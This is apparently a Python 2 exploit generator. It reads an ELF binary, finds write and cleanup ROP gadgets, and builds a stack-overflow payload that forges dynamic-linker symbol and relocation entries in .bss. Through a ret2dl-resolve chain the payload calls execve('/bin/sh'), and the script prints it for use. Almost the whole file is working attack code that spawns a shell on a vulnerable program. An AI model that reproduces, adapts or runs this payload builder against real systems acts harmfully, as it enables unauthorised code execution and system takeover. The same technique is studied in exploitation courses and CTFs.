import sys
import json
import subprocess

import elftools.elf.structs
from elftools.elf.elffile import ELFFile
from elftools.elf.constants import P_FLAGS

config = None

binsh_str = "/bin/sh\0"
execve_str = "execve\0"

ElfN_Versym_size = 2

relocation_types = {
    "EM_386": 7,
    "EM_X86_64": 7
}

writemem_gadgets = {
    "EM_386": (" 8b 54 24 08" + # mov edx,DWORD PTR [esp+0x8] \
               " 8b 44 24 04" + # mov eax,DWORD PTR [esp+0x4] \
               " 89 10"       + # mov DWORD PTR [eax],edx \
               " c3",           # ret \
               4),
    "EM_X86_64": (" 48 8b 54 24 10" + # mov rdx,QWORD PTR [rsp+0x10] \
                  " 48 8b 44 24 08" + # mov rax,QWORD PTR [rsp+0x8] \
                  " 48 89 10"       + # mov QWORD PTR [rax],rdx \
                  " c3",            + # ret \
                  8)

}

cleanup_gadgets = {
    "EM_386": (" 5b" + # pop ebx \
               " 5e" + # pop esi \
               " 5f" + # pop edi \
               " 5d" + # pop ebp \
               " c3",  # ret
               4),
    "EM_X86_64": (" 5b"    + # pop    rbx \
                  " 5d"    + # pop    rbp \
                  " 41 5c" + # pop    r12 \
                  " 41 5d" + # pop    r13 \
                  " 41 5e" + # pop    r14 \
                  " 41 5f" + # pop    r15 \
                  " c3",   + # ret
                  6)
}

class Config:
    __slots__ = "arch", "little", "pointer_size", "bss", "dynstr", "dynsym", \
                "relplt", "plt", "writemem", "write_size", "cleanup_gadget", \
                "cleanup_size", "sip_offset", "filler", "relocation_type", \
                "gnuversion", "dynamic", "versym"

def integer_to_bigendian(n):
    s = '%x' % n
    if len(s) & 1:
        s = '0' + s
    return s.decode('hex')

def bigendian_to_integer(string):
    return string.encode("hex")

class Buffer:
    def __init__(self, start):
        self.start = start
        self.current = start
        self.areas = {}
    def allocate(self, size, align_to=None, alignment=None, name=None):
        result = MemoryArea(self.current, size, align_to, alignment)
        self.current += result.size
        if name is not None:
            self.areas[name] = result
        return result

    def dump(self):
        result = ""
        for k, v in self.areas.iteritems():
            result += "Area " + k + "\n" + "\n".join([" " * 4 + line for line in v.dump().split("\n")]) + "\n"
        return result

def chunks(l, n):
    for i in xrange(0, len(l), n):
        yield l[i:i+n]

def ptr2str(integer):
    string = integer_to_bigendian(integer)
    if config.little:
        return string.rjust(config.pointer_size, "\x00")[::-1]
    else:
        return string.ljust(config.pointer_size, "\x00")

def str2ptr(string):
    ptr = bigendian_to_integer(string)
    if config.little:
        return int("".join(reversed(list(chunks(ptr, 2)))), 16)
    else:
        return int(ptr, 16)

class MemoryArea:
    def __init__(self, start, size, align_to=None, alignment=None):
        if align_to is not None:
            if start < align_to:
                raise Exception("Trying to align to a something which is after our buffer: aligning " + config.pointer_format % start + " to " + config.pointer_format % align_to)
            self.align_to = align_to
            self.alignment = size if (alignment is None) else alignment
            self.start = align(start, self.align_to, self.alignment)
            if self.start != start:
                sys.stderr.write(hex(start) +  " -> " + hex(self.start) + "\n")
            self.index = (self.start - self.align_to) / self.alignment
        else:
            self.alignment = 1
            self.align_to = 0
            self.start = start
            self.index = 0

        self.content = ""
        self.pointer = ptr2str(self.start)
        self.size = size
        self.end = self.start + self.size

    def dump(self):
        result = ""
        result += "Start: " + config.pointer_format % self.start + "\n"
        result += "Size: " + config.pointer_format % self.size + " (" + str(self.size) + ")\n"
        result += "End: " + config.pointer_format % self.end + "\n"
        result += "Base: " + config.pointer_format % self.align_to + "\n"
        result += "Alignment: " + str(self.alignment) + "\n"
        result += "Index: " + hex(self.index) + " (" + str(self.index) + ")\n"
        result += "Content:\n"
        for chunk in chunks(self.content, config.pointer_size):
            result += " " * 4 + " ".join(["%.2x" % ord(c) for c in chunk]) + " " + config.pointer_format % str2ptr(chunk) + "\n"
        return result

    def write_string(self, string):
        string_len = len(string)
        if string_len > self.size:
            raise Exception("You're trying to write {} bytes in a MemoryArea {} bytes wide".format(string_len, self.size))

        if string_len % config.write_size != 0:
            string = string.ljust(string_len + (config.write_size - string_len % config.write_size), "\0")
            string_len = len(string)

        result = ""
        for i, part in enumerate(chunks(string, config.write_size)):
            result += writemem(ptr2str(self.start + i * config.write_size), part)

        self.content += string

        return result

    def write_pointer(self, pointer):
        return self.write_string(ptr2str(pointer))

def writemem(address, value):
    return call("writemem", [address, value])

def call(function_name, parameters):
    if len(parameters) > config.cleanup_size:
        raise Exception("Too many parameters, find a better gadget")

    return ptr2str(getattr(config, function_name)) + \
           ptr2str(config.cleanup_gadget) + \
           "".join(map(str, parameters)) + \
           config.filler * (config.cleanup_size - len(parameters))

def align(address, base, of):
    offset = (address - base) % of
    return address if offset == 0 else address + of - offset

def hex_bytes(string):
    return "".join(map(lambda x: chr(int(x, 16)), filter(len, string.split(" "))))

def find_string(sections, string):
    result = [section.header.p_vaddr + section.data().index(string) for section in sections if string in section.data()]
    if len(result) == 0:
        raise Exception("Can't find gadget " + str(map(lambda char: hex(char)[2:], string)))
    return result[0]

def first_or_none(list):
    return list[0] if len(list) > 0 else None

def config_from_elf(path):
    global config
    config = Config()

    with open(path, "r") as executable_file:
        elf = ELFFile(executable_file)
        get_section = lambda name: first_or_none(filter(lambda section: section.name == name, elf.iter_sections()))

        # Binary type
        config.arch = elf.header.e_machine
        config.little = elf.little_endian
        config.pointer_size = elf.elfclass / 8
        config.pointer_format = ("0x%." + str(config.pointer_size * 2) + "x")
        config.structs = elftools.elf.structs.ELFStructs(config.little, config.pointer_size * 8)

        # Useful sections
        config.bss = get_section(".bss").header.sh_addr
        config.dynstr = get_section(".dynstr").header.sh_addr
        config.dynsym = get_section(".dynsym").header.sh_addr

        relplt_section = get_section(".rel.plt")
        config.addend = relplt_section is None
        if config.addend:
            relplt_section = get_section(".rela.plt")
        config.relplt = relplt_section.header.sh_addr

        config.plt = get_section(".plt").header.sh_addr
        config.gnuversion = get_section(".gnu.version").header.sh_addr

        # Dynamic section
        dynamic_section = get_section(".dynamic")
        config.dynamic = dynamic_section.header.sh_addr
        dynamic_entries = [config.structs.Elf_Dyn.parse(dynamic_entry)
                           for dynamic_entry in
                           chunks(dynamic_section.data(), config.structs.Elf_Dyn.sizeof())]
        versyms = filter(lambda (i, entry): entry.d_tag == "DT_VERSYM", enumerate(dynamic_entries))
        if len(versyms) > 0:
            config.versym = config.dynamic + config.structs.Elf_Dyn.sizeof() * versyms[0][0]

        # Gadgets
        writemem_gadget, config.write_size = writemem_gadgets[config.arch]
        writemem_gadget = hex_bytes(writemem_gadget)
        executable_sections = filter(lambda segment: segment.header.p_flags  & P_FLAGS.PF_X, elf.iter_segments())
        config.writemem = find_string(executable_sections, writemem_gadget)

        cleanup_gadget, config.cleanup_size = cleanup_gadgets[config.arch]
        cleanup_gadget = hex_bytes(cleanup_gadget)
        config.cleanup_gadget = find_string(executable_sections, cleanup_gadget)

        config.sip_offset = int(sys.argv[2])
        config.filler = ptr2str(reduce(lambda x,y: (x << 32) | 0xdeadb00b, xrange(1 + (config.pointer_size % 4)), 0))
        config.relocation_type = relocation_types[config.arch]

def main():
    global config

    executable_path = sys.argv[1]
    config_from_elf(executable_path)
    for slot in config.__slots__:
        sys.stderr.write(slot + ": " + str(getattr(config, slot)) + "\n")
    rel_struct = config.structs.Elf_Rela if config.addend else config.structs.Elf_Rel

    buffer = Buffer(config.bss)
    relocation_target = buffer.allocate(config.pointer_size, name="relocation_target")
    pointer_to_null = buffer.allocate(config.pointer_size, name="pointer_to_null")
    binsh = buffer.allocate(len(binsh_str), name="binsh")
    execve_string = buffer.allocate(len(execve_str), config.dynstr, 1, name="execve_string")
    symbol = buffer.allocate(config.structs.Elf_Sym.sizeof(), config.dynsym, name="symbol")

    # Looks like 64-bit and 32-bit have different alignment for the call to _dl_fixup
    reloc_alignment = 1 if config.pointer_size * 8 == 32 else rel_struct.sizeof()
    reloc = buffer.allocate(rel_struct.sizeof(), config.relplt, reloc_alignment, name="reloc")

    exploit = "A" * config.sip_offset

    # Pointer to NULL
    exploit += pointer_to_null.write_pointer(0)

    # /bin/sh
    exploit += binsh.write_string(binsh_str)

    # No versioning
    if config.versym:
        dynamic_versym_dynentry = config.structs.Elf_Dyn.parse("\0" * config.structs.Elf_Dyn.sizeof())
        dynamic_versym_dynentry.d_tag = "DT_VERSYM"
        dynamic_versym_dynentry.d_val = config.gnuversion - ElfN_Versym_size * symbol.index # + 2 * 2
        dynamic_versym = MemoryArea(config.versym, config.structs.Elf_Dyn.sizeof())
        exploit += dynamic_versym.write_string(config.structs.Elf_Dyn.build(dynamic_versym_dynentry))

    # String
    exploit += execve_string.write_string(execve_str)

    # Symbol
    execve_symbol = config.structs.Elf_Sym.parse("\0" * config.structs.Elf_Sym.sizeof())
    execve_symbol.st_name = execve_string.index
    execve_symbol.st_info.bind = "STB_GLOBAL"
    execve_symbol.st_info.type = "STT_FUNC"

    exploit += symbol.write_string(config.structs.Elf_Sym.build(execve_symbol))

    # Relocation
    execve_reloc = rel_struct.parse("\0" * rel_struct.sizeof())
    execve_reloc.r_offset = relocation_target.start
    execve_reloc.r_info_type = config.relocation_type
    execve_reloc.r_info_sym = symbol.index

    if config.pointer_size * 8 == 32:
        execve_reloc.r_info = execve_reloc.r_info_type | (execve_reloc.r_info_sym << 8)
    else:
        execve_reloc.r_info = execve_reloc.r_info_type | (execve_reloc.r_info_sym << 32)

    exploit += reloc.write_string(rel_struct.build(execve_reloc))

    # Launch
    exploit += ptr2str(config.plt) + ptr2str(reloc.index)

    exploit += config.filler + binsh.pointer + pointer_to_null.pointer + pointer_to_null.pointer + ptr2str(4)

    sys.stderr.write(buffer.dump())

    sys.stdout.write(exploit)

if __name__ == "__main__":
    main()
